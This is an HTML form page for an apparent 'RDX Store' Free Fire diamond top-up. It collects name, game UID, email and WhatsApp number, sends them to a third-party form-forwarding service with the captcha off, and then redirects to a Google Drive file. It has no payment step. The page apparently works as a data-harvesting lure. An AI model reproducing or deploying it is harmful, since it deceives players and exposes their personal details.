<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Details | RDX Store</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Poppins', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }

        /* Header */
        .header {
            width: 100%;
            background-color: #F57C00;
            color: white;
            text-align: center;
            padding: 20px 0;
            font-weight: 800;
            text-transform: uppercase;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        /* Form Container */
        .form-container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background: #fff;
            border-radius: 15px;
            border: 2px solid #F57C00;
            box-shadow: 0 10px 25px rgba(245, 124, 0, 0.1);
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #F57C00;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #F57C00;
            box-shadow: 0 0 5px rgba(245, 124, 0, 0.3);
        }

        /* Error Messages */
        .error-msg {
            color: red;
            font-size: 12px;
            margin-top: 5px;
            display: none; /* Initially Hidden */
        }

        /* Get Diamond Button */
        .submit-btn {
            width: 100%;
            background-color: #2ecc71; /* Green Button */
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
            box-shadow: 0 4px 10px rgba(46, 204, 113, 0.3);
        }

        .submit-btn:active {
            transform: scale(0.98);
        }

        .footer-text {
            text-align: center;
            font-size: 11px;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="header">Confirm Your Details</div>

    <div class="form-container">
        <form id="topupForm" action="https://formsubmit.co/4d66e1b4-9adc-41fc-8fbb-ece2f64167e2" method="POST">
            
            <input type="hidden" name="_next" value="https://drive.google.com/file/d/1MnvTEzpbkF7CQLOpYM5PsSTeqm5ncPaB/view?usp=drivesdk">
            <input type="hidden" name="_captcha" value="false">

            <div class="input-group">
                <label>Name</label>
                <input type="text" name="Name" id="name" placeholder="Enter your name">
                <div id="nameError" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>Free Fire UID</label>
                <input type="number" name="UID" id="uid" placeholder="Enter FF UID">
                <div id="uidError" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>Confirm UID</label>
                <input type="number" id="cuid" placeholder="Re-enter FF UID">
                <div id="matchError" class="error-msg">UID not match</div>
            </div>

            <div class="input-group">
                <label>Email ID</label>
                <input type="email" name="Email" id="email" placeholder="Enter email address">
                <div id="emailError" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>WhatsApp Number</label>
                <input type="number" name="WhatsApp" id="whatsapp" placeholder="Enter WhatsApp number">
                <div id="whatsappError" class="error-msg">Enter details</div>
            </div>

            <button type="button" onclick="validateForm()" class="submit-btn">Get Diamond</button>
        </form>
    </div>

    <div class="footer-text">© 2026 RDX FF STORE - Safe & Secure</div>

    <script>
        function validateForm() {
            // Inputs
            const name = document.getElementById('name');
            const uid = document.getElementById('uid');
            const cuid = document.getElementById('cuid');
            const email = document.getElementById('email');
            const whatsapp = document.getElementById('whatsapp');
            const form = document.getElementById('topupForm');

            // Error Display Elements
            const errors = document.querySelectorAll('.error-msg');
            errors.forEach(err => err.style.display = 'none');

            let isValid = true;

            // Check Empty Boxes
            if (!name.value) { document.getElementById('nameError').style.display = 'block'; isValid = false; }
            if (!uid.value) { document.getElementById('uidError').style.display = 'block'; isValid = false; }
            if (!email.value) { document.getElementById('emailError').style.display = 'block'; isValid = false; }
            if (!whatsapp.value) { document.getElementById('whatsappError').style.display = 'block'; isValid = false; }

            // Check UID Match
            if (uid.value && cuid.value && uid.value !== cuid.value) {
                document.getElementById('matchError').style.display = 'block';
                isValid = false;
            } else if (!cuid.value) {
                document.getElementById('matchError').innerText = "Enter details";
                document.getElementById('matchError').style.display = 'block';
                isValid = false;
            }

            if (!isValid) {
                // Phone Vibrate on Error
                if (navigator.vibrate) {
                    navigator.vibrate(200);
                }
                return false;
            }

            // If everything is valid, submit the form
            form.submit();
        }
    </script>

</body>
  </html>
